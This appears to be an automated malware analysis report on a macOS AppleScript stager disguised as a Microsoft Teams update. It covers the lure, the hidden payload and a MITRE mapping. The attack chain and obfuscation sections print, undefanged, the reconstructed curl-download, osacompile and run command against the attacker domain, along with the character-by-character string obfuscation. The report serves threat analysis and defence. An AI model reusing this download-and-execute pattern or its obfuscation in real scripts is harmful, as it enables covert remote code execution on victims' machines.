# MSTeamsUpdate.scpt — Analysis Report

**Date**: 2026-04-09  
**Analyst**: Claude (automated)  
**Confidence**: HIGH — malicious macOS AppleScript stager

---

## 1. File Metadata

| Field      | Value |
|------------|-------|
| Filename   | MSTeamsUpdate.scpt |
| SHA256     | `245eb1958ba3996aab078a05efc9185bdb9ab19b30742009b7b756ef4077848e` |
| SHA1       | `1756d9effa8d5b5785647aad57856ed1bb2c7576` |
| MD5        | `d8589f83cce291ba52cc35383b4e3f1f` |
| Size       | 1,486 bytes |
| Type       | Unicode text, UTF-8 (AppleScript source) |
| Platform   | macOS |
| Signing    | None (plain text script) |

---

## 2. Classification

**Family**: AppleScript stager / dropper  
**Confidence**: HIGH  
**Platform**: macOS  
**Threat Level**: High — delivers and executes an operator-controlled stage-2 AppleScript from a typosquatting domain

This is a macOS-specific social engineering lure masquerading as a "Microsoft Teams SDK update". The script employs multiple obfuscation layers to conceal a stage-2 downloader that contacts a fake Microsoft domain (`ms-teams.us`), downloads an AppleScript payload, compiles it to binary, executes it in-memory, and cleans up. Stage-2 content is operator-controlled and not recoverable statically.

---

## 3. Capabilities

- **Social engineering lure**: Fake "Microsoft Teams SDK Support" banner claiming the SDK version is deprecated, instructing the user to press the Run (▶️) button in Script Editor
- **Decoy execution**: Opens the legitimate Microsoft Teams documentation URL in the background (`open -g`) to appear benign
- **Visual obfuscation**: ~50 blank lines (lines 18–67) separate the decoy from the malicious payload, hiding it from casual inspection in Script Editor's text view
- **String concatenation obfuscation**: Both the temp file path and the `curl`/`osacompile` shell command are constructed character-by-character via AppleScript string concatenation to evade static string matching
- **Stage-2 download**: Uses `curl -f -s -S -L -k` to download an AppleScript payload from a typosquatting domain; `-k` disables TLS certificate verification
- **Compile-and-run**: Compiles the downloaded text script to binary AppleScript using `osacompile`, then loads and executes it using `run (load script ...)` — fully in-memory execution, no `.app` bundle or persistent disk artifact beyond the temp file
- **Self-cleanup**: Deletes the temp file with `rm` immediately after execution
- **Silent error handling**: Entire payload wrapped in `try … on error … end try` — all failures are silently swallowed, no user-visible error

---

## 4. Attack Chain

```
1. Victim receives/downloads MSTeamsUpdate.scpt
   └─ Lure: "Microsoft Teams SDK update required, press ▶️"

2. Victim opens in Script Editor and clicks Run (▶️)
   └─ Decoy: opens learn.microsoft.com/en-us/microsoftteams/... in background
              (appears to "do something" legitimate)

3. Hidden payload (after ~50 blank lines) executes:
   └─ Constructs: TempFile = /tmp/MSTeamsUpdater.scpt (char-by-char obfuscation)

4. do shell script: curl -f -s -S -L -k \
       https://updatesdk.ms-teams.us/update-macsecond-ryPLs-QWAxm-0ceT4 \
       -o /tmp/MSTeamsUpdater.scpt \
       && osacompile -o /tmp/MSTeamsUpdater.scpt /tmp/MSTeamsUpdater.scpt
   └─ Downloads stage-2 AppleScript source to /tmp/MSTeamsUpdater.scpt
   └─ osacompile overwrites source with compiled binary .scpt

5. run (load script (POSIX file "/tmp/MSTeamsUpdater.scpt"))
   └─ Stage-2 compiled AppleScript loaded and executed in-memory

6. do shell script "rm /tmp/MSTeamsUpdater.scpt"
   └─ Cleanup: temp file deleted

7. Stage-2 behavior: unknown (operator-controlled, not recovered)
```

---

## 5. Obfuscation Detail

### 5a. String concatenation — temp file path
```applescript
set TempFile to "/"&"t"&"m"&"p"&"/"&"M"&"S"&"T"&"e"&"a"&"m"&"s"&"U"&"p"&"d"&"a"&"t"&"e"&"r"&"."&"s"&"c"&"p"&"t"
-- Resolves to: /tmp/MSTeamsUpdater.scpt
```

### 5b. String concatenation — shell command (reconstructed)
```bash
curl -f -s -S -L -k https://updatesdk.ms-teams.us/update-macsecond-ryPLs-QWAxm-0ceT4 \
  -o /tmp/MSTeamsUpdater.scpt \
  && osacompile -o /tmp/MSTeamsUpdater.scpt /tmp/MSTeamsUpdater.scpt
```
The `&&` is encoded as `"&"&"&"` in AppleScript (two string concatenation operators joining an empty string with `&`), which resolves to the shell `&&` (AND operator).

---

## 6. IOCs

### Network (defanged)

| Type   | Value |
|--------|-------|
| Domain | `updatesdk.ms-teams[.]us` |
| URL    | `hxxps://updatesdk[.]ms-teams[.]us/update-macsecond-ryPLs-QWAxm-0ceT4` |
| Decoy URL | `hxxps://learn.microsoft[.]com/en-us/microsoftteams/platform/whats-new` |

**Note**: `ms-teams.us` is a typosquatting domain impersonating Microsoft. The path token `ryPLs-QWAxm-0ceT4` likely functions as a campaign/victim tracking ID.

### Filesystem

| Path | Purpose |
|------|---------|
| `/tmp/MSTeamsUpdater.scpt` | Stage-2 download staging (deleted after execution) |

---

## 7. Emulation Results

Not applicable — this is a macOS AppleScript source file, not a PE binary. No speakeasy/Qiling emulation possible on this REMnux host.

The stage-2 URL was not fetched during analysis to avoid live C2 contact.

---

## 8. Sandbox Results

**Platform**: Tria.ge  
**Sample ID**: `260409-larecaes61`  
**Public URL**: https://tria.ge/260409-larecaes61  
**Overall Score**: 1/10 (static-only analysis)  

- **Behavioral task**: `behavioral1` — **FAILED** (macOS 10.15 backend I/O error: `open tasks/zy16qbqbhbb9x8t9vab3spdw7n: input/output error`)  
- **Static task**: `static1` — completed, score 1 (no signatures triggered on the source text alone)

The low Triage score reflects an infrastructure failure on the macOS behavioral backend, not a clean verdict. The script is unambiguously malicious based on static analysis.

---

## 9. MITRE ATT&CK

| Technique | ID | Description |
|-----------|-----|-------------|
| Masquerading: Match Legitimate Name or Location | T1036.001 | Filename `MSTeamsUpdate.scpt` impersonates Teams updater |
| Command and Scripting Interpreter: AppleScript | T1059.002 | Payload is AppleScript; uses `do shell script` |
| Obfuscated Files or Information | T1027 | Visual blank-line hiding + character-by-character string obfuscation |
| Ingress Tool Transfer | T1105 | Downloads stage-2 from C2 using curl |
| Indicator Removal: File Deletion | T1070.004 | Deletes `/tmp/MSTeamsUpdater.scpt` after execution |
| User Execution: Malicious File | T1204.002 | Requires user to open and run the script |
| Deobfuscate/Decode Files or Information | T1140 | `osacompile` used to compile downloaded text to binary AppleScript |

---

## 10. Analyst Notes

1. **Stage-2 unknown**: The actual malicious behavior is entirely in the stage-2 script fetched from `updatesdk.ms-teams.us`. Without that payload, the full capability set is unknown. Common AppleScript-based stage-2 behaviors include: persistence via `launchctl`/login items, credential theft from Keychain, browser data exfil, or download of a Mach-O payload.

2. **Domain registration**: `ms-teams.us` should be queried via WHOIS and threat intel platforms (VirusTotal, PassiveDNS) to assess actor infrastructure. The `.us` TLD + `ms-teams` subdomain combination is a deliberate Microsoft brand impersonation.

3. **Campaign token**: The URL path `update-macsecond-ryPLs-QWAxm-0ceT4` contains what appears to be a randomized campaign/victim token (`ryPLs-QWAxm-0ceT4`). If multiple samples exist with different tokens, this could be a multi-victim tracking system.

4. **Delivery vector**: The script must be opened and run by the victim. Likely delivered via:
   - Malvertising / fake software download site
   - Phishing email with `.scpt` attachment or link
   - Discord/Slack DM social engineering ("run this to update Teams")

5. **TLS bypass**: `-k` in the curl command ignores certificate errors, suggesting the C2 may use a self-signed certificate or the operator anticipated potential cert issues.

6. **Triage macOS backend failure**: Dynamic analysis was not possible due to Triage infrastructure error. Recommend re-submission or testing in an isolated macOS VM to recover stage-2.
